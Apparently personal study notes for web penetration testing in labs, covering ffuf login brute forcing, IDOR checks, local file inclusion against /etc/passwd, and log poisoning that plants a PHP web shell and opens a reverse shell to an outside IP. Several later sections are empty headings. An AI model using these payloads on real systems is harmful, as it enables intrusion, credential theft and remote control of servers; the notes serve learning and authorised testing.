# Web Hacking

## Authenitcation Bypass

- Always look for .js or .php authentication scripts through Network tab (Advanced Tools F12), BurpSuite or Content Discovery. You could encounter authentication flaws.
- Check Cookies, try to decode them

## Brute Force

```bash

ffuf -w passwords.txt -X POST -d "username=username&password=password" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -[fx] [number or "string for fr"]

ffuf -w usernames.txt:W1,passwords.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -[fx] [number or "string for fr"]

```

Where -fx could be {fc | fw | fr | fl | fs} which are dual with respect to the matching criteria. For example -fc 200 will return only answers with response codes different from 200 (e.g. 301 permanent redirects for correct login)

## IDOR

IDOR stands for Insecure Direct Object Reference. It is a kind of access control vulnerability arised when an applicetion uses user-input to access directly to objects. IDOR first appeared in OWASP 2007 Top Ten. IDOR is associated with Horizontal Privilege Escalation where an attacker could access reserved object by crafting a specific query.

- Check for IDOR vulnerabilities in encoded HTTP Response or Request Header fields.
- Check for IDOR vulnerabilities in Hashed ID and try to reverse them through [crackstation](https://crackstation.net/)
- Check for IDOR effectiveness by using two different accounts trying to switch among them.
- Check for ALL parameters in Network Tab of browser development tools (F12) for calls to any endpoint.

## LFI & RFI

LFI stands for Local File Inclusion, which is a technique where an attacker tricks a web application to retrieve a specific file from the system through a bad sanitized input form or query. It happens, for example, when requesting `http://targetsite.com/get.php?file=userCV.pdf`. If the "get.php" script is bad designed, a malicious user could force `http://targetsite.com/get.php?file=/etc/passwd`, getting all users on the system. LFI exploits PHP functions such as **include**, **require**, **include_once** and **require_once**. You must test out the URL parameter by adding the `dot-dot-slash` notation.

- Check `http://targetsite.com/get.php?file=../../../../etc/passwd` and similar queries. Generally the target is figuring out where is the "get.php" script executed because the Path Traversal (../../../.. ecc) starts from there.
- If the PHP script makes use of `$_GET['param']."ext"`, you could try to bypass it by means of the null character %00 at the end of the URL (ex. `http://targetsite.com/get.php?file=../../../../etc/passwd%00`). **Solved since PHP 5.4**. 
- Check Wrapper "php://filter" for encoding and decoding a target file: `http://targetsite.com/get.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd`. For all Wrappers have a look on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

### LFI-2-RCE

This means getting command execution on target exploiting LFI. 

- If an Apache server is vulnerable to LFI then you can access to `/var/log/apache2/access.log`. Check what are the Request Header parameters stored in the log (eg. User Agent) and then replace one of them with `<?php system($_GET['cmd']); ?>`. Next time you will access to the log file through LFI, the log file will be executed and so does the php injected script. You should then send a query like this:

      http://targetsite.com/get.php?file=../../../../var/log/apache2/access.log&cmd=whoami
      
      Or, you could spawn a reverse shell:
      
      http://targetsite.com/get.php?file=../../../../var/log/apache2/access.log&cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.8.32.131%22%2C5000)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27

Where we URL encoded `php -r '$sock=fsockopen("10.8.32.131",5000);exec("/bin/sh -i <&3 >&3 2>&3");'`. This is also known as **Log poisoning**.
For all other LFI-2-RCE (via /proc/self/environ, via upload, via PHPSESSID, via vsftpd logs ecc.) have a look on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion).

## SSRF

## XSS

## Command Injection

## SQL Injection
